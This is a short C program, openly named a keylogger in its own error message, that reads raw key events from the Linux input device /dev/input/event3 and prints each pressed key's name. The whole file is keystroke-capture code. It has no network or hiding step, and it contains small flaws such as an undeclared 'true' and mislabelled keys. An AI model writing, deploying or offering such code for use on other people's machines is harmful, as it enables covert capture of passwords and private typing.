#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>

char *val[] ={" ","esc","1","2","3","4","5","6","7","8","9","0","-","=","del"," ","q","w","e","r","t","y","u","i",
"o","p","[","]","enter","LEFTCTRL","a","s","d","f","g","h","j","k","l",";","'","<","LEFT_CHIFT","\\","z","x","c","v","b","n","m",",",".","/","RIGHT_SHIFT"
};
int main(int argc, char *argv[])
{
    const char *path = "/dev/input/event3";
    struct input_event ie;
    int fd;
    if((fd = open(path,O_RDONLY)) == -1){
        perror("Keylogger: cannot open /dev/input/event3 for read");
        return 1;
    }
    while (true) {
        int rd = read(fd, &ie, sizeof(ie));
        if(ie.type == EV_KEY && ie.value > 0 && ie.value <= 2 && ie.code > 0 && ie.code <=54)
            printf("%s\n", val[ie.code]);
    }
    return 0;
}
